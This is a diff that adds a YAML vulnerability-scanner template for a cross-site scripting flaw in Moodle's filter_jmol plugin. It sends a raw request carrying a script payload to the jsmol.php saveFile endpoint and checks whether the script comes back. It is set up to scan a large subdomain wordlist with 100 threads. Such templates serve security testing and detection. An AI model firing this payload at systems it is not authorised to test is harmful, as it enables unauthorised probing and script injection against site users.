@@ -1,0 +1,33 @@
+id: moodle-filter-jmol-xss
+info:
+  name: Moodle filter_jmol - XSS
+  author: madrobot
+  severity: medium
+  description: Cross-site scripting on Moodle.
+  reference: https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities/
+  tags: moodle,xss
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<script>alert('XSS')</script>"
+        part: body
+      - type: word
+        part: header
+        words:
+          - "text/html"
